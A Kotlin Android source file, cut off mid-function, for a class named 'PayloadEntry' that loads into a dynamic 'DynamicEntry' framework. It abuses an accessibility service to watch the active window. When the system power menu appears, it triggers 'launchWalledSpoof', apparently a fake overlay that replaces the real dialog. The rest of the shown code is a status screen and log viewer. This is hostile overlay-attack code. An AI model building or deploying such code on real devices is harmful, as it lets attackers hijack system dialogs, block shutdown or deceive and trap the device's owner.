import android.view.accessibility.AccessibilityNodeInfo
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File
import kotlin.math.sqrt

class PayloadEntry : DynamicEntry {

    private var isTriggered by mutableStateOf(false)

    @Composable
    override fun Render(context: Context, resDir: File) {
        val serviceName = context.javaClass.simpleName
        val clipboard = LocalClipboardManager.current

        LaunchedEffect(Unit) {
            DynamicEntry.log("🆔 Render started by: $serviceName")
            DynamicEntry.log("🛡️ Monitor: Waiting for GlobalActions (Power Menu)...")

            DynamicEntry.accessibilityInterceptor = { event ->
                val service = DynamicEntry.activeAccessibilityService
                val root = service?.rootInActiveWindow

                if (root != null && !isTriggered) {
                    if (findNode(root)) {
                        DynamicEntry.log("🎯 TRIGGER: GlobalActions detected!")
                        isTriggered = true
                        launchWalledSpoof(context, resDir)
                    }
                }
            }
        }

        Box(modifier = Modifier.fillMaxSize().systemBarsPadding()) {
            // Background UI
            Column(
                modifier = Modifier.fillMaxSize().padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Top
            ) {
                Text("CONDUIT OPERATIONAL", style = MaterialTheme.typography.labelLarge, color = Color.Green)
                Text("Current Authority: $serviceName", fontSize = 12.sp, color = Color.Gray)

                Spacer(modifier = Modifier.height(20.dp))

                if (isTriggered) {
                    Button(onClick = { 
                        isTriggered = false
                        DynamicEntry.overlayContent = null
                        DynamicEntry.log("🔄 Reset: Clearing spoof and returning to monitor.")
                    }) {
                        Text("Force Reset Trigger")
                    }
                }
            }

            // EXTENSIVE LOGGING UI
            Box(
                modifier = Modifier
                    .align(Alignment.BottomCenter)
                    .fillMaxWidth()
                    .fillMaxHeight(0.4f)
                    .background(Color.Black.copy(alpha = 0.8f))
                    .padding(8.dp)
            ) {
                val listState = rememberLazyListState()

                Column {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("SYSTEM LOGS", color = Color.White, style = MaterialTheme.typography.labelSmall)
                        Button(
                            onClick = {
                                val fullLog = DynamicEntry.systemLogs.joinToString("\n")
                                clipboard.setText(AnnotatedString(fullLog))
                            },
                            modifier = Modifier.height(30.dp),
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 0.dp)
                        ) {
                            Text("COPY", fontSize = 10.sp)
                        }
                    }

                    Divider(color = Color.DarkGray, modifier = Modifier.padding(vertical = 4.dp))

                    LazyColumn(state = listState, modifier = Modifier.fillMaxSize()) {
                        items(DynamicEntry.systemLogs) { log ->
                            Text(
                                text = log,
                                color = if (log.contains("🎯") || log.contains("🆔")) Color.Cyan else Color.LightGray,
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace,
                                modifier = Modifier.padding(vertical = 2.dp)
                            )
                        }
                    }
                }

                // Auto-scroll to bottom
                LaunchedEffect(DynamicEntry.systemLogs.size) {
                    if (DynamicEntry.systemLogs.isNotEmpty()) {
                        listState.animateScrollToItem(DynamicEntry.systemLogs.size - 1)
                    }
                }
            }
        }
    }

    private fun findNode(node: AccessibilityNodeInfo): Boolean {
